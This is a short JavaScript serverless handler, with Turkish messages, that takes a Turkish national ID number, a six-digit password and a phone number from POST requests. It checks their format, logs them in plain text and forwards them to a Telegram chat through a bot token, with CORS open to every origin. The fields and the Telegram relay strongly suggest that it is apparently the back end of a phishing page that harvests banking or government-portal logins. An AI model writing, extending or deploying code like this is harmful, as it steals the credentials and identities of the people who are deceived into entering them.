import axios from 'axios';
import dotenv from 'dotenv';

dotenv.config();

export default async function handler(req, res) {
  // CORS ayarı: Şu an tüm kaynaklardan kabul et (deploy sonrası frontend URL'sine güncellenecek)
  res.setHeader('Access-Control-Allow-Origin', '*'); // Geçici çözüm
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Yalnızca POST istekleri desteklenir.' });
  }

  let body = '';
  req.on('data', chunk => (body += chunk));
  req.on('end', async () => {
    try {
      const { tc, password, phone } = JSON.parse(body);
      if (!tc || tc.length !== 11 || !/^\d+$/.test(tc)) {
        throw new Error('Geçersiz TC numarası.');
      }
      if (!password || password.length !== 6 || !/^\d+$/.test(password)) {
        throw new Error('Geçersiz şifre.');
      }
      if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
        throw new Error('Geçersiz telefon numarası.');
      }

      const message = `TC: ${tc}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;
      console.log('Gönderilen veri:', { tc, password, phone });

      const response = await axios.post(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message,
        }
      );
      console.log('Telegram yanıtı:', response.data);
      res.status(200).json({ message: 'Bilgiler gönderildi.' });
    } catch (error) {
      console.error('Hata:', error.message, error.response?.data);
      res.status(500).json({ message: 'Hata oluştu.', details: error.message });
    }
  });
}